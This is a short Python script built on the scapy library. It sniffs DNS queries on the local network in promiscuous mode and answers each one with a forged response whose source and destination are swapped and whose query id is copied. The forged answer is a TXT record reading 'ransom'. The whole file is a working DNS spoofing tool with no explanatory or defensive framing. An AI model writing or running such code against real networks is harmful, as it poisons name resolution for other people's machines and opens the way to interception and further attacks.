from scapy.all import IP, DNS, UDP, DNSRR, sniff, send

def dnsRes(pkt):

    ip = pkt.getlayer(IP)
    dns = pkt.getlayer(DNS)
    return IP(dst=ip.src, src=ip.dst)/UDP(dport=ip.sport,sport=ip.dport)/DNS(id=dns.id,qd=dns.qd,an=DNSRR(rrname=dns.qd.qname, type='TXT', ttl=10,rdata='ransom'))



def main():
    while 1:
        a=sniff(filter="port 53",count=1,promisc=1)
        if not a[0].haslayer(DNS) or a[0].qr:
            continue
        send(dnsRes(a[0]))

if __name__ == '__main__':
    main()